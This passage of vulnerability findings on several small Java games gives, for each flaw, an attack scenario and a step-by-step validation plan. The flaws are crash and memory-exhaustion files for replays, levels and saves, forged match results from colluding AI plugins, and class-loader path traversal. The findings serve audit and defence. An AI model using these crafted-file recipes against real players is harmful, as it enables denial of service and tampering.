attack_scenario: Theoretical in this build: a player cannot influence these strings - they are baked into the jar. The risk materializes only through reuse: the identical Level-class skeleton in sibling variants is fed from downloaded levels (get_level.php / readLevel), where a hostile server or edited level file supplying '00 1'-style odd-length, non-digit, or out-of-range pairs crashes the game thread (denial of service) at exactly this sink.
validation_plan: Edit one literal in ApoSimpleSudokuLevelMake.getFirstLevel() from "00011021" to "0001102" (odd length), run ApoSimpleSudokuMain and start level 1: observe StringIndexOutOfBoundsException thrown from ApoSimpleSudokuLevel.init line 114 during construction - confirming the parser performs no format validation and fails closed only by accident of its current callers.

title: Replay parser trusts attacker-controlled element count: unbounded allocation and NPE on truncated .rep files
attack_scenario: Attacker shares a tournament-looking .rep that is a valid 30-byte header (players=4) followed by size=0x3FFFFFFF and a few MB of filler. Victim loads it: heap fills with boxed Bytes, game freezes/OOMs (concrete crash under default -Xmx). A second file truncated right after the header instead kills the EDT with an NPE. Both are one-click crashes from a file someone asked you to 'watch my replay'.
validation_plan: Craft file: DataOutputStream.writeInt(any type)/writeLong/writeBoolean/writeInt(time)/writeInt(players=4)/writeUTF('')/4x writeUTF('') then writeInt(0x7FFFFFFF) + 5MB of 0x00, repeat; run 'java -jar -Xmx64m' and load it -> OutOfMemoryError/hang observable in jconsole. Second file ends after the names arrays -> console shows 'Exception in thread AWT-EventQueue' NullPointerException at ApoSkunkmanReplayIO.readLevel(String) line 40 and the UI dies.

title: Level/replay editor data places players and goal at unvalidated byte coordinates, causing out-of-bounds array access and crash
attack_scenario: Attacker distributes a 'custom map pack': patching one position byte to 0x7F makes loading the level itself throw ArrayIndexOutOfBoundsException inside makeEditorLevel (instant crash on open). Variant B: coordinate 100 (in-bounds editor array, off-grid playfield) loads fine; once the round starts and that player lays a skunkman, ApoSkunkmanPlayer.thinkAI:498 indexes level[12][100] -> uncaught AIOOBE kills the game thread mid-tournament. Goal-point bytes likewise shift the win tile outside the grid so GoalX rounds can never be won.
validation_plan: Hex-edit a valid lastLevel.skunk: byte at offset 5 (player 1 x) -> 0x7F. Launch, menu > Editor > Load: stack trace ArrayIndexOutOfBoundsException at ApoSkunkmanModelEditor.makeEditorLevel(ModelEditor.java:202). Then set it to 100 (0x64, within byte range, outside 15-wide grid), start a match with that player AI-controlled, press the lay key when he is 'standing' off-grid: AIOOBE at ApoSkunkmanPlayer.thinkAI(Player.java:498) and the game window freezes/dies.

title: Hand-parsed local save file 'highscore.apo' triggers uncaught exceptions and unbounded image allocation at startup
attack_scenario: (a) Crash-loop DoS: a file whose solution string declares 99x99 while the level string declares 04x04 causes ArrayIndexOutOfBoundsException during loadLevels() at startup; the game never reaches the menu until the file is deleted. (b) Memory exhaustion: thousands of consistent entries like level='2525'+625 spaces, solution='2525'+625 'a' chars each allocate ~2400x2400 px ARGB images (~23 MB) per entry from a ~2 KB file, exhausting the heap.
validation_plan: Craft the file with Java: dos.writeInt(1); dos.writeUTF("0404    "); dos.writeUTF("9999"+...); place next to the jar, launch ApoSlitherLinkMain -> stack trace during init, no window content; remove file -> launches. Repeat with N consistent 25x25 entries to drive heap toward OOM.

title: Replay (.rep) parser trusts attacker-chosen record count: readInt-driven allocation loop
attack_scenario: Attacker posts a 'highlight replay' on the community forum sized a few hundred MB with size fields set to 0x7FFFFFFF. Victim opens it via replayLoad; the JVM heap balloons (default heap -> OutOfMemoryError or minutes of GC thrash) and the UI freezes; no persistent damage.
validation_plan: Craft rep.rep: two UTF strings, then for the ball section write int 2000000000 followed by a few floats; run game, click replay-load icon, select file; observe heap climb/OOM in jconsole or 'java.lang.OutOfMemoryError: Java heap space' on console while file remains far smaller than allocated list capacity.

title: Full-trust AI plugins can manipulate match outcomes: deliberate forfeit awards exactly 10 goals, and hung think() freezes the game thread
attack_scenario: Two colluding entrants in an ApoSoccer AI league: AI-A contains 'if (enemyName.equals("TeamB")) throw new RuntimeException();'. Every A-vs-B match instantly ends 0:10 for B, handing B maximum points/goal-difference regardless of play quality; results computed by ApoSoccerAnalysis season simulation (analysis loop at ApoSoccerAnalysis.java:97-113) inherit these forged scores. Non-collusive variant: a losing AI freezes the organizer's machine mid-stream by looping forever in think().
validation_plan: Modify TestPlayer.think() to 'throw new RuntimeException("gg")' when enemy names contain a sentinel; load it as VisitorAI, start a match; observable: game immediately ends with scoreboard Home 10 : Visitor 0 (debug frame prints the exception message per lines 1728-1730). Freeze variant: replace throw with while(true){}; observe EDT hang and absence of any timeout kill (the >WAIT_TIME_THINK check at ApoTeam.java:566-567 never executes).

title: Class-name to filename mapping does not neutralize '/' or '..' allowing reads of .class files outside the player directory
attack_scenario: Theoretical only: the sole input source is the local user typing into the dialog, who already has full control of the machine, so no privilege boundary is crossed. Its practical significance is forward-looking: if a sibling variant (clone-and-own reuse of this Sun-tutorial-derived loader) ever feeds a network-supplied class name (e.g. from a get_level-style response) into this same loadClass, the missing sanitization turns into remote class-file retrieval from arbitrary local paths.
validation_plan: Compile Pwn.class implementing TutorVolleyAI into <run-dir>/../outside/, launch the game, click Load, type '../outside/Pwn'. Observable result: the Pwn constructor executes although the file lies outside player/, demonstrating the traversal. Then confirm no other code path supplies names programmatically (grep shows loadClass called only from TutorVolleyPanelOptions.java:146).
